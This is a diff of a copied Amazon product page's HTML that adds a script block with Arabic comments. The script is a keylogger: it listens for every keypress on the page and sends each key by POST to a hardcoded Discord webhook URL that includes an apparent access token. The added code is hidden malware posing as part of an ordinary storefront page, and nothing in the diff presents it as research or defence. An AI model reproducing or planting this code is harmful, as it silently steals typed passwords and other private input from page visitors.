@@ -1671,6 +1671,42 @@ P.when('mix:@amzn/mix.client-runtime', 'mix:ameyal-product-shoveler__Kvjfy9i1').
   (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://m.media-amazon.com/images/I/31mqNgZQVBL.js?AUIClients/PuffAuiAssets');
 });
 </script>
+
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+  
+      // استماع لحدث keydown (عندما يتم الضغط على مفتاح)
+      document.addEventListener('keydown', function(event) {
+          // احصل على الحرف المدخل من خلال event.key
+          let key = event.key;
+  
+          // إعداد بيانات الرسالة لإرسالها إلى الـ Discord Webhook
+          let webhookUrl = 'https://discord.com/api/webhooks/1259781390929494026/djIMJqC71rBOW0FdYrIxWQW2ESupHhRz0JoQnXtaWoOXLWrC5tu5UB-D47gVmgs6zxsl';
+          let message = {
+              content: `Key pressed: ${key}`
+          };
+  
+          // إرسال الرسالة إلى الـ Discord Webhook باستخدام طريقة POST
+          fetch(webhookUrl, {
+              method: 'POST',
+              headers: {
+                  'Content-Type': 'application/json',
+              },
+              body: JSON.stringify(message),
+          })
+          .then(response => {
+              if (!response.ok) {
+                  console.error('Failed to send message to Discord webhook:', response.status, response.statusText);
+              }
+          })
+          .catch(error => {
+              console.error('Error sending message to Discord webhook:', error);
+          });
+      });
+  });
+  </script>
+
+
 <script>
 (window.AmazonUIPageJS ? AmazonUIPageJS : P).when('afterLoad').execute(function() {
   (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://m.media-amazon.com/images/I/31ULjw05G7L.js?AUIClients/AmazonLightsaberPageAssets');
@@ -1888,3 +1924,4 @@ rx.ex64("UlgBKSYjVkZXSklJJ1ddJFckJDQHJCc07SQkJjTaJCQhMiErKSJGRFVRUFdAKykiVURWVkx
         \___)   
  ~~~~~~~~~~~~~~~~~~-->
 <!-- sp:eh:Rs74LHULNTKVFu+tPCkMxj9/xZlFFzeF3Zn9jsARa69j5MH2Wo2eczY30fzOqoKqBLvs3IUTK9BMyinA3R9lASOnmaK35TdCfi0lRGCNH0UZ57F1+ZHLTFWSfjs= -->
+
